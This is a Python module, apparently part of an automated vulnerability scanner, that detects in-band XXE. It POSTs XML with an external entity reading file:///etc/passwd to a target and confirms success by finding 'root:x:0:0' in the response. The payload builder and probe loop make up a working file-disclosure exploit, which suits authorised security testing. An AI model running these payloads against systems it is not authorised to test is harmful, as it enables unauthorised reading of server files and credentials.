"""
Smart XXE Hunter - XML External Entity 検出スペシャリスト (SGK-2026-0486)

外部実体（`<!ENTITY x SYSTEM "file:///etc/passwd">`）を含む XML を送り、
サーバがローカルファイルを解決して応答に反映する in-band XXE を検出する。
実害＝ローカルファイル漏洩。製品固有のエンドポイント/パラメータ名は
ハードコードせず、汎用的な XML パラメータ名・ラッパ要素名の候補を試す。

証拠は「システムファイルの特徴的内容の反映」（例 /etc/passwd の
``root:x:0:0``）で、我々が外部実体ペイロードを送った事実と合わせて確定する。
"""
import logging
import re
from typing import Any, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

META_KEYS = {
    "_auth", "method", "content_type", "task_id", "targets", "targets_file",
    "source_file", "cookies", "tags", "category", "_context", "extra_targets",
    "auth_headers", "headers", "count", "forms", "url_evidence", "scan_profile",
    "profile", "detection_mode", "phase", "phase_hint",
}

# 読み取り対象のシステムファイルと、その内容の非自明な署名（自然混入しにくい）。
# /etc/passwd の "root:x:0:0" は XXE ファイル読み取りの標準的な高信頼指標。
_XXE_FILE = "file:///etc/passwd"
_XXE_FILE_SIGNATURE = re.compile(r"root:.*?:0:0:")

# in-band 反映のためのラッパ要素名（汎用・製品非依存の一般的な XML 要素名）。
_XXE_WRAPPER_ELEMENTS: Tuple[str, ...] = ("items", "data", "root", "xml", "foo")
# XML を受け取りうる汎用パラメータ名（task 由来の param を優先し、これは補完）。
_XXE_FALLBACK_PARAMS: Tuple[str, ...] = ("xml", "xxe", "data", "body", "content")
# 保存する応答スニペットの半径。
_XXE_SNIPPET_RADIUS = 400


def _build_xxe_payload(entity: str, element: str, file_uri: str) -> str:
    """外部実体を参照する最小 XML を組み立てる。"""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE r [<!ENTITY {entity} SYSTEM "{file_uri}">]>'
        f"<{element}>&{entity};</{element}>"
    )


class SmartXXEHunter(Specialist):
    name = "SmartXXEHunter"
    description = "In-band XML External Entity (local file disclosure) detector"
    timeout_seconds = 120
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}
        self.last_results: List = []

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        result = await self._probe_xxe(task)
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    def _candidate_params(self, task: Task) -> List[str]:
        params = task.params if isinstance(getattr(task, "params", None), dict) else {}
        provided = [
            k for k, v in params.items()
            if k and k not in META_KEYS and not str(k).startswith("_")
            and not isinstance(v, (dict, list, tuple, set))
        ]
        out: List[str] = []
        for p in provided + list(_XXE_FALLBACK_PARAMS):
            if p not in out:
                out.append(p)
        return out

    def _auth_headers(self, task: Task) -> Dict[str, str]:
        params = task.params if isinstance(getattr(task, "params", None), dict) else {}
        _auth = params.get("_auth", {}) if isinstance(params.get("_auth"), dict) else {}
        headers = dict(_auth.get("auth_headers", {}) or {})
        cookies = str(_auth.get("cookies", "") or params.get("cookies", "") or "")
        if cookies and "Cookie" not in headers:
            headers["Cookie"] = cookies
        return headers

    async def _probe_xxe(self, task: Task) -> Optional[Dict[str, Any]]:
        """汎用ペイロードを送り、システムファイル内容の反映で XXE を確定する。
        観測できれば proof dict、なければ None（fail-closed）。"""
        url = task.target
        auth_headers = self._auth_headers(task)
        entity = "xxe" + _rand_token()

        # 1) raw XML body（Content-Type: application/xml）
        for element in _XXE_WRAPPER_ELEMENTS:
            payload = _build_xxe_payload(entity, element, _XXE_FILE)
            proof = await self._send_and_check(
                url, method="POST", param=None, payload=payload,
                auth_headers=auth_headers, content_type="application/xml",
            )
            if proof is not None:
                return proof

        # 2) form パラメータ（application/x-www-form-urlencoded）
        for param in self._candidate_params(task):
            for element in _XXE_WRAPPER_ELEMENTS:
                payload = _build_xxe_payload(entity, element, _XXE_FILE)
                proof = await self._send_and_check(
                    url, method="POST", param=param, payload=payload,
                    auth_headers=auth_headers,
                    content_type="application/x-www-form-urlencoded",
                )
                if proof is not None:
                    return proof
        return None

    async def _send_and_check(
        self, url: str, *, method: str, param: Optional[str], payload: str,
        auth_headers: Dict[str, str], content_type: str,
    ) -> Optional[Dict[str, Any]]:
        try:
            status, body = await self._send(
                url, method=method, param=param, payload=payload,
                auth_headers=auth_headers, content_type=content_type,
            )
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.debug("[%s] XXE send failed for %s: %s", self.name, url, exc)
            return None
        if status <= 0 or not body:
            return None
        if not _XXE_FILE_SIGNATURE.search(body):
            return None
        return {
            "request_method": method,
            "request_url": url,
            "param": param,
            "payload": payload,
            "content_type": content_type,
            "file_uri": _XXE_FILE,
            "response_status": status,
            "served_body": _snippet(body, _XXE_FILE_SIGNATURE),
        }

    async def _send(
        self, url: str, *, method: str, param: Optional[str], payload: str,
        auth_headers: Dict[str, str], content_type: str,
    ) -> Tuple[int, str]:
        """XXE ペイロードを送信（``self._client`` 注入 seam or AsyncNetworkClient）。
        form モードは data={param: payload}、raw モードは data=payload。"""
        headers = dict(auth_headers or {})
        headers["Content-Type"] = content_type
        data: Any = {param: payload} if param is not None else payload

        async def _do(client):
            return await client.request(
                method, url, data=data, headers=headers, use_proxy=True
            )

        injected = getattr(self, "_client", None)
        if injected is not None:
            resp = await _do(injected)
        else:
            from src.core.infra.network_client import AsyncNetworkClient
            async with AsyncNetworkClient() as client:
                resp = await _do(client)
        status = int(getattr(resp, "status", 0) or 0)
        body = getattr(resp, "body", None)
        if body is None:
            body = getattr(resp, "text", "") or ""
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="replace")
        return status, str(body)

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        method = proof["request_method"]
        url = proof["request_url"]
        param = proof.get("param")
        payload = proof["payload"]
        content_type = proof["content_type"]
        status = proof["response_status"]
        served_body = proof["served_body"]
        file_uri = proof["file_uri"]

        request_body = (
            _urlencode_form(param, payload) if param is not None else payload
        )
        poc_request = (
            f"{method} {url} HTTP/1.1\r\n"
            f"Content-Type: {content_type}\r\n"
            "\r\n"
            f"{request_body}"
        )
        poc_response = (
            f"HTTP/1.1 {status}\r\n"
            "Content-Type: text/html\r\n"
            "\r\n"
            f"{served_body}"
        )
        impact = (
            f"XML パーサが外部実体を解決し、ローカルファイル（{file_uri}）の内容が"
            "応答に反映された（XML External Entity・in-band ファイル読み取り）。"
            "攻撃者はサーバ上の任意の読み取り可能ファイル（設定・資格情報・鍵等）を"
            "取得でき、内部サービスへの SSRF にも発展し得る重大な実害。"
        )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.XXE,
            severity=Severity.CRITICAL,
            title="XXE: External Entity Local File Disclosure",
            description=(
                "In-band XML External Entity injection confirmed: an external "
                f"entity referencing {file_uri} was resolved and its content "
                "reflected in the response."
            ),
            source_agent=self.name,
            confidence=0.97,
            impact=impact,
            reproduction_steps=[
                f"外部実体 <!ENTITY ... SYSTEM \"{file_uri}\"> を含む XML を "
                f"{method} で送信する"
                + (f"（パラメータ '{param}'）。" if param else "（生の XML ボディ）。"),
                "応答本文にシステムファイルの内容（例: /etc/passwd の "
                "'root:x:0:0'）が反映されることを確認する。",
            ],
            tags=["xxe", "critical", "xxe_file_read"],
            evidence=Evidence(
                request_method=method,
                request_url=url,
                request_headers={"Content-Type": content_type},
                request_body=request_body,
                response_status=status,
                response_headers={"Content-Type": "text/html"},
                response_body=served_body,
            ),
            additional_info={
                "xxe_evidence": {
                    "request_method": method,
                    "request_url": url,
                    "param": param,
                    "payload": payload,
                    "content_type": content_type,
                    "file_uri": file_uri,
                    "response_status": status,
                    "served_body": served_body,
                },
                "xxe_replay": {
                    "method": method,
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "content_type": content_type,
                },
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )


def _rand_token() -> str:
    import uuid
    return uuid.uuid4().hex[:8]


def _urlencode_form(param: str, payload: str) -> str:
    from urllib.parse import urlencode
    return urlencode({param: payload})


def _snippet(body: str, pattern: re.Pattern, radius: int = _XXE_SNIPPET_RADIUS) -> str:
    """署名一致箇所を中心にしたスニペット（証拠を保持しつつコンパクト化）。"""
    m = pattern.search(body)
    if m:
        start = max(0, m.start() - radius)
        end = min(len(body), m.end() + radius)
        return body[start:end]
    return body[:2000]
